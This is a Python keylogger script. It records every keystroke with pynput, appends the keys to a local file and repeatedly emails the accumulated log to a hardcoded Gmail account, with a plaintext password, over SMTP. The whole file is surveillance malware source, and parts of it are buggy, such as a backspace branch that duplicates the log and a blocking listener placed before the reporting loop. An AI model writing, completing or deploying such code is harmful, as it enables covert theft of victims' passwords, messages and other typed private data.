import pynput.keyboard as keyboard
import threading
import smtplib


log=""
caps=False
count=0

def grab_keys(key):
    global log,caps,count

    print(str(key))
    with open("keyfile.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print("Error getting char")




    case = False
    try:
        if caps:
            log=log+str(key.char).swapcase()
        else:
            log=log+str(key.char)

    except Exception:
        if str(key) =='Key.space':
            log+=" "

        elif str(key) =='Key.shift':
            pass

        elif str(key) == 'Key.backspace':
            log += log[:-1]

        elif str(key)=='Key.caps_lock':
            caps=True
            count+=1
            if count>1:
                count=0
                caps=False

        elif str(key)=='Key.enter':
            log+='\n'
        else:
            log+=" " + str(key)+ " "


    print(log)

listener=keyboard.Listener(on_press=grab_keys)

with listener:
    listener.join()

email, pssd= 'tryingmabest1@gmail.com', 'Thisisforthedegree'
def report():
    global log
    mail(email, pssd, log)
    log=""
    timer=threading.Timer(8,report)
    timer.start()

listener=keyboard.Listener(on_press=grab_keys)

with listener:
    report()
    listener.join()

def mail (email, pssd, mssg):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, pssd)
    server.sendmail(email, email, mssg)
    server.quit()



